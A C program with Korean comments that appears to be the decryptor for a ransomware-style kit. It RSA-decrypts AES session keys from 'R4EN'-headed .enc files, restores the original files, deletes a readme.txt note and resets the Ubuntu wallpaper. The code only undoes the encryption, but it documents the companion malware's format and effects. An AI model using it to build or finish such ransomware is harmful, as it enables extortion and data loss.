// decrypt.c
// 지정한 디렉터리 안의 모든 .enc 파일을 복호화하고,
// 해당 디렉터리의 readme.txt 삭제 + Ubuntu 22.04 기본 바탕화면으로 복구하는 단일 파일.

// 빌드 예시:
//   gcc -Wall -Wextra -O2 decrypt.c -lcrypto -o decrypt
// 사용 예시:
//   ./decrypt ./target_dir

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <libgen.h>    // dirname()
#include <errno.h>
#include <dirent.h>    // opendir, readdir
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <openssl/err.h>

#define AES_KEY_SIZE   16
#define AES_IV_SIZE    16
#define AES_BLOCK_SIZE 16

/*
 * enc_header_t
 *
 * encrypt.c / encrypt.h 에서 사용한 헤더 구조를 그대로 다시 정의.
 * .enc 파일 맨 앞 부분에 이 구조체가 그대로 기록되어 있다.
 *
 * [파일 포맷]
 *   [enc_header_t][enc_key(ek_len)][iv(iv_len)][cipher(나머지)]
 */
typedef struct {
    char     magic[4];       // "R4EN"
    uint8_t  version;        // 버전 번호
    uint8_t  reserved[3];    // 예약(0)
    uint32_t original_size;  // 원본 파일 크기
    uint16_t ek_len;         // 암호화된 세션키 길이
    uint16_t iv_len;         // IV 길이
} enc_header_t;

/* ---------------------------------------------------------
 * 문자열이 특정 suffix(예: ".enc")로 끝나는지 확인
 * --------------------------------------------------------- */
static int ends_with(const char *str, const char *suffix)
{
    if (!str || !suffix) return 0;

    size_t len_str    = strlen(str);
    size_t len_suffix = strlen(suffix);

    if (len_suffix > len_str) return 0;

    return (strncmp(str + (len_str - len_suffix), suffix, len_suffix) == 0);
}

/* =========================================================
 * AES-128-CBC 복호화 함수
 *  - cipher 버퍼를 복호화해서 plain 버퍼를 동적 할당하여 반환.
 * ========================================================= */
static int aes_decrypt_buffer(const uint8_t *cipher, size_t cipher_len,
                              const uint8_t *key, const uint8_t *iv,
                              uint8_t **out_plain, size_t *out_plain_len)
{
    EVP_CIPHER_CTX *ctx = NULL;
    uint8_t *plain = NULL;
    int len = 0;
    int plain_len = 0;
    int ret = -1;

    if (!cipher || !key || !iv || !out_plain || !out_plain_len)
        return -1;

    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "[DECRYPT] EVP_CIPHER_CTX_new failed\n");
        return -1;
    }

    plain = (uint8_t *)malloc(cipher_len + AES_BLOCK_SIZE);
    if (!plain) {
        fprintf(stderr, "[DECRYPT] malloc(plain) failed\n");
        goto cleanup;
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv) != 1) {
        fprintf(stderr, "[DECRYPT] EVP_DecryptInit_ex failed\n");
        ERR_print_errors_fp(stderr);
        goto cleanup;
    }

    if (EVP_DecryptUpdate(ctx, plain, &len, cipher, (int)cipher_len) != 1) {
        fprintf(stderr, "[DECRYPT] EVP_DecryptUpdate failed\n");
        ERR_print_errors_fp(stderr);
        goto cleanup;
    }
    plain_len = len;

    if (EVP_DecryptFinal_ex(ctx, plain + plain_len, &len) != 1) {
        fprintf(stderr, "[DECRYPT] EVP_DecryptFinal_ex failed\n");
        ERR_print_errors_fp(stderr);
        goto cleanup;
    }
    plain_len += len;

    *out_plain = plain;
    *out_plain_len = (size_t)plain_len;
    plain = NULL;  // 소유권 이동
    ret = 0;

cleanup:
    if (plain) free(plain);
    if (ctx)   EVP_CIPHER_CTX_free(ctx);
    return ret;
}

/* =========================================================
 * RSA 개인키(private.pem)으로 AES 세션키 복호화
 *  - encrypt.c에서 RSA_public_encrypt()로 암호화된 key를 되돌린다.
 * ========================================================= */
static int rsa_decrypt_key(const uint8_t *enc_key, size_t enc_len,
                           uint8_t *out_key, size_t out_key_len)
{
    FILE *fp = fopen("private.pem", "rb");
    if (!fp) {
        perror("[DECRYPT] fopen private.pem");
        return -1;
    }

    RSA *rsa = PEM_read_RSAPrivateKey(fp, NULL, NULL, NULL);
    fclose(fp);

    if (!rsa) {
        fprintf(stderr, "[DECRYPT] Failed to load private key\n");
        ERR_print_errors_fp(stderr);
        return -1;
    }

    int dec = RSA_private_decrypt((int)enc_len, enc_key,
                                  out_key, rsa, RSA_PKCS1_OAEP_PADDING);

    RSA_free(rsa);

    if (dec != (int)out_key_len) {
        fprintf(stderr, "[DECRYPT] RSA_private_decrypt failed (dec=%d)\n", dec);
        ERR_print_errors_fp(stderr);
        return -1;
    }

    return 0;
}

/* =========================================================
 * restore_wallpaper_default()
 *
 * - Ubuntu 22.04 에서 GNOME 배경화면을 "기본값" 이미지로 되돌린다.
 * - 파일을 삭제하는 것이 아니라, gsettings 에 저장된 배경 이미지 경로를
 *   기본 배경 이미지로 덮어쓰는 방식이다.
 *
 *   기본 배경 예: /usr/share/backgrounds/warty-final-ubuntu.png
 * ========================================================= */
static int restore_wallpaper_default(void)
{
    const char *default_wallpaper = "/usr/share/backgrounds/warty-final-ubuntu.png";

    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "gsettings set org.gnome.desktop.background picture-uri 'file://%s' && "
        "gsettings set org.gnome.desktop.background picture-uri-dark 'file://%s'",
        default_wallpaper, default_wallpaper
    );

    printf("[DECRYPT] Restoring wallpaper to Ubuntu 22.04 default: %s\n",
           default_wallpaper);
    printf("[DECRYPT] Executing: %s\n", cmd);

    int result = system(cmd);
    if (result == -1) {
        perror("[DECRYPT] Failed to execute gsettings command");
        return -1;
    }

    printf("[DECRYPT] Wallpaper restored to Ubuntu default.\n");
    return 0;
}

/* =========================================================
 * delete_readme_in_dir()
 *
 * - target_dir/readme.txt 를 삭제한다.
 *   (없으면 에러 로그만 찍고 무시)
 * ========================================================= */
static void delete_readme_in_dir(const char *target_dir)
{
    if (!target_dir) return;

    char readme_path[4096];
    if (snprintf(readme_path, sizeof(readme_path), "%s/readme.txt", target_dir)
        >= (int)sizeof(readme_path)) {
        fprintf(stderr, "[DECRYPT] readme path too long\n");
        return;
    }

    if (remove(readme_path) == 0) {
        printf("[DECRYPT] Removed readme: %s\n", readme_path);
    } else {
        // 없거나 권한 없을 수 있음 → 치명적 에러는 아님
        perror("[DECRYPT] Failed to remove readme");
    }
}

/* =========================================================
 * make_original_path()
 *
 * - "<...>.enc" 에서 마지막 ".enc" 를 떼고 원래 파일 경로를 만든다.
 *   예: "/path/sample.docx.enc" → "/path/sample.docx"
 * ========================================================= */
static int make_original_path(const char *enc_path, char *out, size_t out_sz)
{
    size_t len = strlen(enc_path);
    const char *suffix = ".enc";
    size_t slen = strlen(suffix);

    if (len <= slen) return -1;
    if (strcmp(enc_path + len - slen, suffix) != 0) return -1;

    if (len - slen + 1 > out_sz) return -1;

    memcpy(out, enc_path, len - slen);
    out[len - slen] = '\0';
    return 0;
}

/* =========================================================
 * decrypt_file()
 *
 * - 하나의 .enc 파일을 읽어서 원본 데이터를 복원.
 * - 출력 파일 이름: "<enc_path>에서 .enc 떼고 원래 이름으로"
 *   예: "sample4.docx.enc" → "sample4.docx"
 * - 복호화 성공 시 .enc 파일은 삭제.
 * ========================================================= */
static int decrypt_file(const char *enc_path)
{
    FILE *fp = NULL;
    uint8_t *enc_key = NULL;
    uint8_t *cipher  = NULL;
    uint8_t *plain   = NULL;
    size_t   plain_len = 0;
    int      ret = -1;

    if (!enc_path) {
        fprintf(stderr, "[DECRYPT] enc_path is NULL\n");
        return -1;
    }

    fp = fopen(enc_path, "rb");
    if (!fp) {
        perror("[DECRYPT] fopen");
        return -1;
    }

    /* 1) 헤더 읽기 */
    enc_header_t hdr;
    if (fread(&hdr, 1, sizeof(hdr), fp) != sizeof(hdr)) {
        fprintf(stderr, "[DECRYPT] Failed to read header\n");
        goto cleanup;
    }

    if (memcmp(hdr.magic, "R4EN", 4) != 0) {
        fprintf(stderr, "[DECRYPT] Invalid magic header\n");
        goto cleanup;
    }

    printf("[DECRYPT] Decrypting: %s\n", enc_path);
    printf("[DECRYPT]   original size = %u bytes\n", hdr.original_size);
    printf("[DECRYPT]   ek_len = %u, iv_len = %u\n", hdr.ek_len, hdr.iv_len);

    /* 2) 암호화된 세션키 읽기 */
    enc_key = (uint8_t *)malloc(hdr.ek_len);
    if (!enc_key) {
        fprintf(stderr, "[DECRYPT] malloc(enc_key) failed\n");
        goto cleanup;
    }
    if (fread(enc_key, 1, hdr.ek_len, fp) != hdr.ek_len) {
        fprintf(stderr, "[DECRYPT] Failed to read enc_key\n");
        goto cleanup;
    }

    /* 3) IV 읽기 */
    uint8_t iv[AES_IV_SIZE];
    if (hdr.iv_len != AES_IV_SIZE) {
        fprintf(stderr, "[DECRYPT] Unexpected IV length: %u\n", hdr.iv_len);
        goto cleanup;
    }
    if (fread(iv, 1, hdr.iv_len, fp) != hdr.iv_len) {
        fprintf(stderr, "[DECRYPT] Failed to read IV\n");
        goto cleanup;
    }

    /* 4) 나머지 암호문 전체 읽기 */
    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("[DECRYPT] fseek END");
        goto cleanup;
    }

    long total = ftell(fp);
    if (total < 0) {
        perror("[DECRYPT] ftell");
        goto cleanup;
    }

    long cipher_start = (long)sizeof(hdr) + hdr.ek_len + hdr.iv_len;
    long cipher_len   = total - cipher_start;
    if (cipher_len <= 0) {
        fprintf(stderr, "[DECRYPT] cipher_len <= 0\n");
        goto cleanup;
    }

    if (fseek(fp, cipher_start, SEEK_SET) != 0) {
        perror("[DECRYPT] fseek cipher_start");
        goto cleanup;
    }

    cipher = (uint8_t *)malloc(cipher_len);
    if (!cipher) {
        fprintf(stderr, "[DECRYPT] malloc(cipher) failed\n");
        goto cleanup;
    }
    if (fread(cipher, 1, cipher_len, fp) != (size_t)cipher_len) {
        fprintf(stderr, "[DECRYPT] Failed to read cipher\n");
        goto cleanup;
    }

    fclose(fp);
    fp = NULL;

    /* 5) RSA로 AES 세션키 복호화 */
    uint8_t aes_key[AES_KEY_SIZE];
    if (rsa_decrypt_key(enc_key, hdr.ek_len, aes_key, AES_KEY_SIZE) != 0) {
        fprintf(stderr, "[DECRYPT] rsa_decrypt_key failed\n");
        goto cleanup;
    }

    /* 6) AES-128-CBC 복호화 */
    if (aes_decrypt_buffer(cipher, (size_t)cipher_len, aes_key, iv,
                           &plain, &plain_len) != 0) {
        fprintf(stderr, "[DECRYPT] aes_decrypt_buffer failed\n");
        goto cleanup;
    }

    /* 7) 출력 파일 이름: ".enc" 제거한 원래 경로 */
    char out_path[4096];
    if (make_original_path(enc_path, out_path, sizeof(out_path)) != 0) {
        fprintf(stderr, "[DECRYPT] make_original_path failed for %s\n", enc_path);
        goto cleanup;
    }

    FILE *out = fopen(out_path, "wb");
    if (!out) {
        perror("[DECRYPT] fopen output");
        goto cleanup;
    }

    /* 8) original_size 만큼만 작성 (PKCS#7 패딩 제거) */
    if (hdr.original_size > plain_len) {
        fprintf(stderr, "[DECRYPT] original_size > plain_len\n");
        fclose(out);
        goto cleanup;
    }

    if (fwrite(plain, 1, hdr.original_size, out) != hdr.original_size) {
        fprintf(stderr, "[DECRYPT] fwrite output failed\n");
        fclose(out);
        goto cleanup;
    }

    fclose(out);
    printf("[DECRYPT]   restored file: %s\n", out_path);

    /* 9) 복호화 성공 시 .enc 파일 삭제 */
    if (remove(enc_path) != 0) {
        perror("[DECRYPT] Failed to remove encrypted file");
        // 삭제 실패해도 복호화는 성공했으니 ret 은 그대로 0 유지 가능하지만,
        // 여기서는 경고만 찍고 계속 진행.
    }

    ret = 0;

cleanup:
    if (fp)      fclose(fp);
    if (enc_key) free(enc_key);
    if (cipher)  free(cipher);
    if (plain)   free(plain);

    return ret;
}

/* =========================================================
 * process_directory()
 *
 * - target_dir 내부의 "일반 파일" 중
 *   이름이 ".enc"로 끝나는 파일만 골라 decrypt_file() 호출.
 * - 서브 디렉터리는 들어가지 않는 비재귀 방식 (암호화 쪽과 동일).
 * ========================================================= */
static void process_directory(const char *target_dir)
{
    DIR *dp = opendir(target_dir);
    if (!dp) {
        perror("[DECRYPT] opendir");
        return;
    }

    struct dirent *entry;
    char path[4096];
    struct stat st;

    while ((entry = readdir(dp)) != NULL) {
        const char *filename = entry->d_name;

        if (strcmp(filename, ".") == 0 || strcmp(filename, "..") == 0)
            continue;

        if (snprintf(path, sizeof(path), "%s/%s", target_dir, filename)
            >= (int)sizeof(path)) {
            fprintf(stderr, "[DECRYPT] path too long: %s/%s\n",
                    target_dir, filename);
            continue;
        }

        if (stat(path, &st) == -1) {
            perror("[DECRYPT] stat");
            continue;
        }

        if (S_ISREG(st.st_mode)) {
            /* ".enc" 로 끝나는 파일만 복호화 대상 */
            if (ends_with(filename, ".enc")) {
                if (decrypt_file(path) != 0) {
                    fprintf(stderr, "[DECRYPT] Failed to decrypt: %s\n", path);
                }
            }
        }
    }

    closedir(dp);
}

/* =========================================================
 * main()
 *
 * 사용법:
 *   gcc -Wall -Wextra -O2 decrypt.c -lcrypto -o decrypt
 *   ./decrypt <target_directory>
 *
 * 동작:
 *   1) target_directory 안의 모든 .enc 파일 복호화
 *      → 원래 파일 이름으로 되살리고 .enc 파일 삭제
 *   2) target_directory/readme.txt 삭제 시도
 *   3) Ubuntu 22.04 기본 바탕화면으로 복구
 * ========================================================= */
int main(int argc, char *argv[])
{
    if (argc != 2) {
        printf("Usage: %s <target_directory>\n", argv[0]);
        return 1;
    }

    const char *target_dir = argv[1];
    printf("[DECRYPT] Target directory: %s\n", target_dir);

    /* target_dir 이 실제 디렉터리인지 확인 */
    struct stat st;
    if (stat(target_dir, &st) == -1) {
        perror("[DECRYPT] stat");
        return 1;
    }
    if (!S_ISDIR(st.st_mode)) {
        fprintf(stderr, "[DECRYPT] Not a directory: %s\n", target_dir);
        return 1;
    }

    /* 1) 디렉터리 내 .enc 파일들 복호화 */
    process_directory(target_dir);

    /* 2) readme.txt 삭제 */
    delete_readme_in_dir(target_dir);

    /* 3) 바탕화면 Ubuntu 기본으로 복구 */
    if (restore_wallpaper_default() != 0) {
        fprintf(stderr, "[DECRYPT] Failed to restore wallpaper\n");
    }

    printf("[DECRYPT] All done.\n");
    return 0;
}

